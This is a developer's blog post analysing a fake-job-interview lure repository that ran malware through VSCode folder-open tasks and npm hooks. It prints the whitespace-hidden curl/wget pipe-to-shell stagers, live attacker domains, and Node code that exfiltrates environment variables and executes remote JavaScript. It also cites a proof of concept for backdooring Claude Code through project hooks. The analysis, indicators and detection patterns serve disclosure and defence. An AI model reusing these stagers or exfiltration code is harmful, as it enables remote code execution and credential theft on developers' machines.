---
title: "I had a fake job interview. It was a malware delivery chain."
datePublished: 2026-04-29T12:30:25.348Z
cuid: cmok19cfw004i2di49xkiaefs
slug: i-had-a-fake-job-interview-it-was-a-malware-delivery-chain
cover: https://cdn.hashnode.com/uploads/covers/69d4b99a5da14bc70e00d4f6/49c754f4-83d9-474e-9be0-e1d4268d2cfb.png
tags: malware, vs-code, cybersecurity, devsecops, threat-intelligence, supply-chain, contagious-interview

---

> 2026-04-29 — A fake recruiter tried to walk me into opening a malicious VSCode workspace.  
> I refused, preserved the artifacts, mapped the infrastructure, and submitted the IOCs to public threat-intel feeds.

* * *

## TL;DR

Today I was invited to what looked like a normal Google Meet job interview.

The recruiter asked me to review a Web3 poker/casino repository and open it in VSCode.

I did not.

Instead, I inspected the repository in the browser first and found a malicious `.vscode/tasks.json` file.

The repository was configured to execute shell commands automatically when the folder is opened in VSCode after Workspace Trust is granted:

*   Linux: `wget ... | sh`
    
*   macOS: `curl ... | bash`
    
*   Windows: `curl ... | cmd`
    

The commands were visually hidden by pushing the `"command"` field more than 200 columns to the right with whitespace padding.

The payloads were hosted on rotating Vercel subdomains under `/api/settings/{linux,mac,windows}`.

Further analysis showed a second execution path through `npm install`, a BeaverTail-style Node.js RCE/exfil chain hidden behind a base64-encoded `.env` value, and infrastructure rotating across at least 16 Vercel-hosted projects since January 2026.

I submitted the indicators and infrastructure reports to:

*   abuse.ch ThreatFox
    
*   abuse.ch URLhaus
    
*   GitHub Trust & Safety
    
*   Vercel Trust & Safety
    
*   LinkedIn Trust & Safety
    

Vercel has acknowledged the abuse report under case number `01139817`.

GitHub has acknowledged the repository abuse report under support ticket `#4339052`.

This is the lesson:

> Opening an unknown repository in a modern developer tool is not a passive action anymore.

The old mental model was:

> "I did not run the code, I only opened the project."

That model is broken.

The real question is:

> "Did my tooling trust the project?"

* * *

## How it started

On 2026-04-13, I received a LinkedIn InMail from a profile using the name:

> John Armour Lamont  
> CEO & Founder | Climate action through Technology

The message looked like ordinary recruiter outreach:

*   DevSecOps
    
*   security architecture
    
*   Kubernetes
    
*   CI/CD
    
*   scalable infrastructure
    
*   Web3 platform
    
*   DevSecOps Lead / Solution Architect
    

All of that matches my public LinkedIn profile closely enough to feel plausible.

But the message also had the classic smell of a generic lure:

*   no company name
    
*   no product name
    
*   no founder names
    
*   no funding source
    
*   no concrete architecture
    
*   no concrete chain
    
*   no real technical framing
    

I asked for details before scheduling anything.

The answer stayed vague:

> "The MVP is completed, and we've secured initial funding $6M."  
> "The team is lean but growing."  
> "We're leveraging EVM compatible chains."  
> "It would be better to discuss this during the meeting."

That is not proof of malice.

But it is exactly the kind of vague-but-plausible language that works well in recruiter pretexts.

A few Calendly links later, we scheduled the call.

![](https://cdn.hashnode.com/uploads/covers/69d4b99a5da14bc70e00d4f6/2e9ec054-d0cb-4e88-9fbe-a1f80bf24716.png align="center")

* * *

## The thing that saved me

Two days before the interview, I read [a Reddit post about a Claude Code proof-of-concept](https://www.reddit.com/r/blueteamsec/comments/1sw26a2/claudecodebackdoor_backdooring_claude_code_via/) by [Zhangir Ospanov](https://www.linkedin.com/in/s0ld13r/).

The PoC is here:

```text
https://github.com/s0ld13rr/claude-code-backdoor
```

The core point was simple:

Claude Code can execute project-local hooks from `.claude/settings.json` when a trusted project starts.

That is not a magic exploit. It is tool behavior.

But the security boundary matters.

The dangerous situation is not:

> "I ran the malware."

The dangerous situation is:

> "I opened an untrusted project inside a tool that can execute project-local automation."

That same pattern exists across modern developer tooling:

*   `.vscode/tasks.json`
    
*   `.claude/settings.json`
    
*   Cursor / Windsurf project configs
    
*   `package.json` scripts
    
*   `preinstall` / `postinstall` / `prepare`
    
*   Makefiles
    
*   Git hooks
    
*   Docker Compose files
    
*   CI configs
    
*   language-server initialization paths
    

I made a mental note:

> If somebody asks me to open an unfamiliar repository in any IDE, inspect the project automation files first.

Two days later, that note mattered.

* * *

## The interview

On 2026-04-29, the Google Meet call started normally.

We talked about my background. There were no meaningful technical questions. No architecture discussion. No real DevSecOps interview.

Then, about 25 minutes in, the recruiter sent the repository:

```text
https://github.com/Novara1o1/jackpot
```

The project looked like a Web3 poker/casino application.

The README looked plausible. The repository had history. The stack looked believable:

*   React
    
*   Next.js
    
*   Solidity
    
*   Hardhat
    
*   ethers.js
    
*   MongoDB
    
*   SettleMint references
    

I said:

> "This is JavaScript. I mostly do Python."

The answer:

> "That's fine. Just review it. Could you open it in VSCode?"

That was the trigger.

Why VSCode specifically?

I had already told him I use PyCharm.

A normal interviewer would not care which editor I use for a superficial review.

But this repository cared.

So I did not open it in VSCode.

I inspected it in the browser.

Then I went straight to `.vscode/`.

![](https://cdn.hashnode.com/uploads/covers/69d4b99a5da14bc70e00d4f6/d942486a-ea49-40e6-a937-29984d7ec97e.png align="center")

* * *

## The VSCode trap

The repository contained a `.vscode/tasks.json` file with folder-open tasks.

Simplified, the relevant part looked like this:

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "install-root-modules",
      "type": "shell",
      "command": "npm install --silent --no-progress",
      "runOptions": {
        "runOn": "folderOpen"
      },
      "presentation": {
        "reveal": "silent",
        "echo": false,
        "focus": false,
        "panel": "new",
        "showReuseMessage": false,
        "clear": true
      }
    },
    {
      "label": "env",
      "type": "shell",
      "linux": {
                                                                                                                                                                                                                                         "command": "wget -qO- 'https://ip-address-check-mo.vercel.app/api/settings/linux' | sh"
      },
      "osx": {
                                                                                                                                                                                                                                         "command": "curl -L 'https://ip-address-check-mo.vercel.app/api/settings/mac' | bash"
      },
      "windows": {
                                                                                                                                                                                                                                         "command": "curl --ssl-no-revoke -L https://ip-address-check-mo.vercel.app/api/settings/windows | cmd"
      },
      "presentation": {
        "reveal": "silent",
        "echo": false,
        "focus": false,
        "close": true,
        "panel": "new",
        "showReuseMessage": false,
        "clear": true
      },
      "runOptions": {
        "runOn": "folderOpen"
      }
    }
  ]
}
```

The important part is not only the command.

The important part is the interaction:

```json
"runOptions": {
  "runOn": "folderOpen"
}
```

combined with:

```json
"presentation": {
  "reveal": "silent",
  "echo": false,
  "focus": false,
  "close": true
}
```

This means:

1.  The task is eligible to run when the folder opens.
    
2.  After Workspace Trust is granted, the shell command can execute.
    
3.  The terminal output is suppressed or hidden.
    
4.  The command is not clearly surfaced as a separate, explicit security decision.
    

And then there is the visual trick:

The `"command"` field was pushed far to the right with whitespace.

In the sample I analyzed, the malicious command began after more than 200 ASCII spaces.

The repository's `.vscode/settings.json` also set:

```json
{
  "editor.wordWrap": "off"
}
```

So a casual reviewer opening the file in VSCode sees a harmless-looking structure and may not visually notice the command at all.

This is not clever cryptography.

It is better than that.

It abuses developer habit.

![](https://cdn.hashnode.com/uploads/covers/69d4b99a5da14bc70e00d4f6/dca1d4f8-9382-4d70-8576-2409e01e90ad.png align="center")

![](https://cdn.hashnode.com/uploads/covers/69d4b99a5da14bc70e00d4f6/18c50fa6-694e-4222-8275-a134e3e2b872.png align="center")

## Why this works

The attacker does not need to convince the developer to run malware.

They only need to convince the developer to follow a normal workflow:

```text
clone repo
open folder
trust workspace
let tooling initialize
```

That is the real trust-boundary failure.

The human thinks:

> "I am just opening the project."

The tool thinks:

> "This workspace is trusted, so project automation can run."

The attacker thinks:

> "Perfect."

This is the same class of problem as:

*   Claude Code hooks in `.claude/settings.json`
    
*   package manager lifecycle scripts
    
*   Makefile targets
    
*   Git hooks
    
*   CI workflow files
    
*   language-specific project bootstrap files
    

The security boundary is no longer:

> Did I manually execute the application?

The security boundary is:

> Did my tooling trust the project?

* * *

## The first payload layer: Vercel-hosted stagers

The active lure repository referenced this domain:

```text
ip-address-check-mo.vercel.app
```

with OS-specific endpoints:

```text
/api/settings/linux
/api/settings/mac
/api/settings/windows
```

The commands used the classic download-and-execute pattern:

```bash
wget -qO- 'https://ip-address-check-mo.vercel.app/api/settings/linux' | sh
```

```bash
curl -L 'https://ip-address-check-mo.vercel.app/api/settings/mac' | bash
```

```cmd
curl --ssl-no-revoke -L https://ip-address-check-mo.vercel.app/api/settings/windows | cmd
```

That is not a settings API.

That is a staged execution path.

During the investigation, I mapped a rotating set of Vercel-hosted projects used by the same campaign pattern.

The Stage-1 stager infrastructure observed so far:

| Date | Stager domain |
| --- | --- |
| 2026-04-28 | `ip-address-check-mo.vercel.app` |
| 2026-04-20 | `vscode-address-checking-mo.vercel.app` |
| 2026-04-13 | `ip-address-check1.vercel.app.vercel.app` |
| 2026-04-07 | `vscode-ip-checking-nine.vercel.app` |
| 2026-03-31 | `ip-address-vscode-checking.vercel.app` |
| 2026-03-17 | `vscode-ipaddress-checking-nine.vercel.app` |
| 2026-03-16 | `vscode-ipaddress-checking.vercel.app` |
| 2026-03-13 | `vscode-ip-address-checking-ten.vercel.app` |
| 2026-03-13 | `vscode-ip-address-checking.vercel-ten.app` |
| 2026-03-02 | `vscode-ip-address-checking.vercel.app` |
| 2026-03-02 | `vscode-ip-addess-checking.vercel.app` |
| 2026-02-27 | `vscode-settings-tasks-227.vercel.app` |
| 2026-02-23 | `vscode-ipchecking.vercel.app` |
| 2026-02-20 | `vscode-settings-tasks-json.vercel.app` |
| 2026-02-03 | `vscodesetting-task.vercel.app` |
| 2026-01-27 | `vscodesettingtask.vercel.app` |

There are obvious operator mistakes in that list:

*   doubled `.vercel.app`
    
*   `vercel-ten.app` instead of `.vercel.app`
    
*   `addess` instead of `address`
    

That matters.

Typos are often better pivot material than perfect infrastructure.

They show manual editing, copy/paste drift, and operational pressure.

* * *

## The second payload layer: npm lifecycle execution

The VSCode path was not the only execution vector.

The repository also carried an npm-based path.

In `package.json`:

```json
"scripts": {
  "start": "node server/server.js | react-scripts --openssl-legacy-provider start",
  "build": "node server/server.js | react-scripts --openssl-legacy-provider build",
  "test": "node server/server.js | react-scripts --openssl-legacy-provider test",
  "eject": "node server/server.js | react-scripts --openssl-legacy-provider eject",
  "prepare": "node server/server.js"
}
```

The dangerous one is:

```json
"prepare": "node server/server.js"
```

`prepare` is an npm lifecycle script.

So if the victim does not open the project in VSCode but instead runs:

```bash
npm install
```

the server-side JavaScript still executes.

That gives the attacker two chances:

1.  IDE auto-execution via `.vscode/tasks.json`
    
2.  npm lifecycle execution via `prepare`
    

This is exactly how good malware chains are built.

They do not rely on one path.

They layer normal developer behaviors until one of them fires.

![](https://cdn.hashnode.com/uploads/covers/69d4b99a5da14bc70e00d4f6/2baf5cca-3b23-4428-958d-5a39bdee8bc2.png align="center")

* * *

## The third layer: BeaverTail-style Node.js RCE and environment exfiltration

The repository also contained a hidden runtime chain in the application code.

In `server/routes/api/auth.js`, simplified:

```javascript
const verified = validateApiKey();

if (!verified) {
  console.log("Aborting mempool scan due to failed API verification.");
  return;
}

async function validateApiKey() {
  verify(setApiKey(process.env.AUTH_API))
    .then((response) => {
      const executor = new Function("require", response.data);
      executor(require);
      return true;
    })
    .catch((err) => {
      return false;
    });
}
```

In `server/controllers/auth.js`:

```javascript
const setApiKey = (s) => atob(s);

const verify = (api) =>
  axios.post(api, { ...process.env }, {
    headers: {
      "x-app-request": "ip-check"
    }
  });
```

What this does:

1.  Reads `process.env.AUTH_API`
    
2.  Base64-decodes it
    
3.  POSTs the entire `process.env` to the decoded URL
    
4.  Receives JavaScript code as response
    
5.  Executes that code with:
    

```javascript
new Function("require", response.data)
```

That is full Node.js RCE.

It also exfiltrates the victim's environment variables.

The `.env` file is designed to look harmless:

```bash
NODE_ENV=development
PORT=3000
ALCHEMY_API_KEY=demo-alchemy-0123456789abcdef
ETHERSCAN_API_KEY=etherscan_demo_ABC123DEF456
POLYGONSCAN_API_KEY=polygonscan_demo_ABC123DEF456
INFURA_IPFS_PROJECT_ID=infura-ipfs-demo-112233
OPENAI_API_KEY=sk-test_OpenAIkey1234567890
PINATA_API_KEY=pinata_test_key_9876543210
STRIPE_SECRET_KEY=sk_test_STRIPEKEY123456
COINBASE_COMMERCE_API_KEY=cc_test_COINBASE12345
AUTH_API=aHR0cHM6Ly95LWhhemVsLXRlbi52ZXJjZWwuYXBwL2FwaQ==
AWS_ACCESS_KEY_ID=AKIAEXAMPLE12345
AWS_SECRET_ACCESS_KEY=SecretKeyExample/AbC1234567890
```

Most values are obvious demo placeholders.

One value is not.

```bash
AUTH_API=aHR0cHM6Ly95LWhhemVsLXRlbi52ZXJjZWwuYXBwL2FwaQ==
```

Decoded:

```text
https://y-hazel-ten.vercel.app/api
```

That is a second Vercel-hosted endpoint, separate from the VSCode stager rotation.

So the repository contains at least two distinct malicious infrastructure paths:

*   Stage-1 OS-specific shell stagers under `/api/settings/{linux,mac,windows}`
    
*   Stage-2 BeaverTail-style Node.js RCE/exfil endpoint under `/api`
    

The fake `x-app-request: ip-check` header is there to make the traffic look like a harmless IP or environment check.

It is not harmless.

It sends the victim's environment to the operator.

* * *

## Why I classify this as Contagious-Interview-style tradecraft

I am careful with attribution.

I cannot prove who sat behind the keyboard during my call.

The LinkedIn profile may be fake, compromised, impersonated, or operated by the attacker.

But the tradecraft strongly overlaps with publicly documented Contagious Interview activity:

*   fake recruiter outreach
    
*   Web3 / crypto / casino / blockchain lure projects
    
*   GitHub-hosted project repositories
    
*   developer asked to open the project locally
    
*   npm lifecycle execution paths
    
*   JavaScript malware
    
*   BeaverTail-style code patterns
    
*   base64-obfuscated C2 endpoint
    
*   environment-variable exfiltration
    
*   remote JavaScript execution via `new Function`
    
*   Vercel-hosted rotating infrastructure
    
*   short-lived operator accounts
    

That is the important point.

Whether the exact operator label is Lazarus, Sapphire Sleet, DEV#POPPER, CL-STA-0240, OtterCookie, or another overlapping cluster is less important for defenders than the execution pattern.

The practical defensive message is the same:

> Fake job interviews are being used to get developers to execute malware through normal project tooling.

* * *

## What I reported

I submitted the malicious repository and infrastructure to the relevant platforms.

### Vercel Trust & Safety

Vercel acknowledged the report under case number:

```text
01139817
```

The report covered:

*   15 Stage-1 Vercel stager domains
    
*   1 Stage-2 BeaverTail-style RCE/exfil endpoint
    
*   shared URL pattern `/api/settings/{linux,mac,windows}`
    
*   likely shared operator naming patterns
    
*   known GitHub-attributed operator emails
    
*   ThreatFox and URLhaus references
    

The requested actions were:

1.  Take down the listed malicious projects
    
2.  Block redeployment by related operator accounts
    
3.  Hunt for sister projects using the same naming and endpoint patterns
    
4.  Preserve metadata for correlation with abuse.ch / law enforcement where appropriate
    

### GitHub Trust & Safety

GitHub acknowledged the report under support ticket:

```text
#4339052
```

Reported repository:

```text
https://github.com/Novara1o1/jackpot
```

Reason:

*   malicious `.vscode/tasks.json`
    
*   `runOn: folderOpen`
    
*   silent shell stager execution
    
*   npm lifecycle execution path
    
*   BeaverTail-style Node.js RCE/exfil chain
    

### LinkedIn Trust & Safety

Reported the recruiter profile as potentially:

*   fake
    
*   compromised
    
*   impersonated
    
*   used as part of a recruiting malware campaign
    

I am deliberately not stating that the real-world person named on the profile is the attacker.

That is important.

The profile is part of the observed attack chain.

The identity behind it is a separate question.

### VSCode hardening note

I am not treating this as a VSCode vulnerability claim in this article.

Workspace Trust is a real security boundary, and the attacker still needs the victim to grant trust.

But the user experience is still worth discussing because this campaign abuses the gap between two different mental models.

A user can interpret "I trust the authors" as:

> "I trust this repository enough to inspect it."

A developer tool can interpret it as:

> "Project-local automation may execute."

Those are not the same decision.

For `runOn: folderOpen` shell tasks, a safer design would require explicit per-task approval and display the complete command before first execution.

Especially when the task uses:

```json
"presentation": {
  "reveal": "silent",
  "echo": false,
  "focus": false,
  "close": true
}
```

The important defensive lesson is not "VSCode is broken."

The lesson is:

> Project trust can become command execution. Treat it accordingly.

## Public threat-intel

Indicators from this investigation were submitted to public abuse.ch feeds.

ThreatFox:

```text
https://threatfox.abuse.ch/browse/tag/jackpot/
```

URLhaus:

```text
https://urlhaus.abuse.ch/browse/tag/jackpot/
```

My ThreatFox profile:

```text
https://threatfox.abuse.ch/user/12877/
```

The indicators include:

*   Vercel stager domains
    
*   active stager URLs
    
*   BeaverTail-style endpoint
    
*   malicious file hashes
    
*   campaign tag `jackpot`
    
*   malware family tags where accepted by the platform
    

This matters because social-media warnings are useful, but structured threat-intel is ingestible.

Defenders can block it.

Researchers can pivot from it.

Platforms can correlate it.

That is the goal.

* * *

## Detection ideas

### Repository static checks

Before opening an unknown repository in any IDE, search for project-local execution surfaces:

```bash
find . -maxdepth 4 \( \
  -path "*/.vscode/tasks.json" -o \
  -path "*/.vscode/settings.json" -o \
  -path "*/.claude/settings.json" -o \
  -name "package.json" -o \
  -name "Makefile" -o \
  -path "*/.git/hooks/*" -o \
  -name "docker-compose.yml" \
\) -print
```

Search for suspicious folder-open tasks:

```bash
grep -RInE '"runOn"[[:space:]]*:[[:space:]]*"folderOpen"|curl.*\|.*(sh|bash|cmd)|wget.*\|.*(sh|bash)' .
```

Search for JavaScript runtime-eval patterns:

```bash
grep -RInE 'new Function|eval\(|process\.env|axios\.post|atob\(' .
```

Search for base64-looking environment values:

```bash
grep -RInE '^[A-Z0-9_]+=[A-Za-z0-9+/]{30,}={0,2}$' .env* 2>/dev/null
```

### Runtime detection ideas

Watch for editor or Node processes spawning network downloaders:

```text
Code.exe / code
  -> cmd.exe / powershell.exe / bash / sh
    -> curl / wget
      -> pipe to sh/bash/cmd
```

Watch for Node processes posting environment-sized payloads to unknown Vercel domains.

Watch for traffic to:

```text
*.vercel.app/api/settings/linux
*.vercel.app/api/settings/mac
*.vercel.app/api/settings/windows
```

especially when launched by:

*   VSCode
    
*   Cursor
    
*   Windsurf
    
*   Claude Code
    
*   npm
    
*   node
    
*   bash
    
*   sh
    
*   cmd.exe
    
*   powershell.exe
    

* * *

## Lessons learned

### 1\. Unknown repositories are hostile until proven otherwise

Do not open unknown repositories directly in your normal IDE.

Not VSCode.

Not Cursor.

Not Windsurf.

Not Claude Code.

Not anything with project-level automation.

Use a plain text viewer, browser review, container, or VM first.

### 2\. "Open this in VSCode" is now a security-relevant request

That sentence used to sound normal.

It is still normal in many contexts.

But in recruiter calls, freelance interviews, code-review lures, crypto projects, and "quick technical checks", it should raise your blood pressure a little.

Not panic.

Just friction.

A good answer is:

```text
I do not open untrusted repositories directly in an IDE during calls.
I will inspect it offline in a controlled environment.
```

A real recruiter accepts that.

An attacker pushes back.

### 3\. Trust prompts are not enough

The problem is not that users are stupid.

The problem is that the trust prompt asks the wrong question too broadly.

A user may trust a workspace enough to browse it.

That does not mean the user knowingly approved automatic shell execution.

Tooling needs finer-grained trust decisions.

Especially for:

*   shell tasks
    
*   lifecycle scripts
    
*   hooks
    
*   AI-agent startup hooks
    
*   commands downloaded from the network
    
*   commands piped into interpreters
    

### 4\. AI coding tools have the same class of problem

This is bigger than VSCode.

The same trust-boundary issue exists in AI coding tools and agentic developer environments.

Project-local config is no longer just configuration.

It can be execution policy.

That includes files like:

```text
.claude/settings.json
.vscode/tasks.json
.cursor/
.windsurf/
package.json
Makefile
.git/hooks/
docker-compose.yml
.github/workflows/
```

The security question is not:

> Did I run the program?

The question is:

> What did my tooling run for me?

### 5\. Awareness works

I refused this attack because two days earlier I had read about the same trust-boundary problem in Claude Code through Zhangir Ospanov's PoC.

Different tool.

Same pattern.

That awareness changed my behavior at the exact right moment.

This is why I am linking his work directly:

*   [Zhangir Ospanov on LinkedIn](https://www.linkedin.com/in/s0ld13r/)
    
*   [claude-code-backdoor PoC on GitHub](https://github.com/s0ld13rr/claude-code-backdoor)
    

So yes, sharing these findings matters.

Blog posts matter.

Reddit posts matter.

LinkedIn posts matter.

IOCs matter.

They put patterns into people's heads before the attacker reaches them.

* * *

## If you were targeted

If you received recruiter outreach matching this pattern, or were asked to open the `jackpot` repository or a similar Web3 project in VSCode, treat it seriously.

If you only viewed the repository in a browser, you are likely fine.

If you downloaded the ZIP but did not open it in an IDE, run `npm install`, or execute scripts, you are likely fine.

If you opened it in VSCode and clicked Workspace Trust, or ran `npm install`, or started the app locally, treat the machine as potentially compromised.

Immediate steps:

1.  Disconnect the machine from sensitive networks.
    
2.  Preserve artifacts if you can do so safely.
    
3.  Rotate credentials that were present in environment variables, shell config, npm config, cloud CLIs, wallet tooling, SSH agents, browser sessions, and developer secrets.
    
4.  Check shell history, VSCode task history, npm logs, process execution logs, EDR telemetry, and outbound network logs.
    
5.  Look for connections to Vercel `/api/settings/*` endpoints and `y-hazel-ten.vercel.app/api`.
    
6.  Rebuild from a known-good state if execution is confirmed.
    

* * *

## References

*   ThreatFox campaign tag: `jackpot`  
    `https://threatfox.abuse.ch/browse/tag/jackpot/`
    
*   URLhaus campaign tag: `jackpot`  
    `https://urlhaus.abuse.ch/browse/tag/jackpot/`
    
*   ThreatFox user profile:  
    `https://threatfox.abuse.ch/user/12877/`
    
*   Zhangir Ospanov — LinkedIn:  
    `https://www.linkedin.com/in/s0ld13r/`
    
*   Zhangir Ospanov — Claude Code backdoor PoC:  
    `https://github.com/s0ld13rr/claude-code-backdoor`
    
*   VSCode Workspace Trust documentation:  
    `https://code.visualstudio.com/docs/editing/workspaces/workspace-trust`
    
*   VSCode Tasks documentation:  
    `https://code.visualstudio.com/docs/editor/tasks`
    

* * *

## Closing thought

This was not a "malicious repository" in the old sense.

It was a malicious developer workflow.

The repository did not need me to run the app.

It needed me to behave like a normal developer.

Open the folder.

Trust the workspace.

Let the tool initialize.

That is the attack.

And that is why this needs to be understood beyond this single case.

* * *

Follow me on [GitHub](https://github.com/oliver-zehentleitner), [X](https://x.com/unicorn_oz) and [LinkedIn](https://www.linkedin.com/in/oliver-zehentleitner/) to stay updated on my latest releases. Your constructive feedback is always appreciated!